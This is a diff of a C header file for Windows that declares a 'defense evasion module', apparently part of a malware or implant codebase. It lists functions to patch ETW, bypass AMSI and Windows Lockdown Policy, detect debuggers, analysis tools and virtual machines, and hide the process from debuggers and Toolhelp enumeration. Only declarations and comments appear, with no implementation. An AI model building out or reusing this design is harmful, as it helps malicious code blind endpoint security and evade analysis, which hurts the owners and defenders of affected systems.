@@ -1,18 +1,30 @@
 #pragma once
+#ifndef DEFENSE_H
+#define DEFENSE_H
 #include <windows.h>
+#include <stdbool.h>
 
-/* Patch ETW — nop out EtwEventWrite */
-void EtwPatcher(void);
+/* ============================================================
+ * DEFENSE EVASION MODULE
+ * Patches EDR/monitoring systems and detects analysis environments
+ * ============================================================ */
 
-/* Bypass AMSI — AmsiScanBuffer returns clean */
-void AmsiBypass(void);
+/* Phase 1: Anti-Analysis Detection */
+bool DefenseCheckDebugger(void);
+bool DefenseDetectAnalysisTools(void);
+bool DefenseDetectVirtualMachine(void);
 
-/* Bypass WLDP — WldpIsClassInApprovedList returns clean */
-void WldpBypass(void);
+/* Phase 2: Defense System Patching */
+bool DefensePatchETW(void);           /* Disable Event Tracing for Windows */
+bool DefensePatchAMSI(void);          /* Bypass AMSI scanning */
+bool DefensePatchWLDP(void);          /* Bypass Windows Lockdown Policy */
 
-/* Anti-analysis checks */
-int  IsBeingDebugged(void);
-int  DetectAnalysisTools(void);
+/* Phase 3: Runtime Hiding */
+bool DefenseHideFromDebugger(void);
+bool DefenseHideProcessFromToolhelp(void);
 
-/* Hide current thread from debugger (NtSetInformationProcess) */
-void HideFromDebugger(void);
+/* Phase 4: Cleanup & Reporting */
+void DefenseResetSecurityChecks(void);
+int DefenseGetLastError(void);
+
+#endif
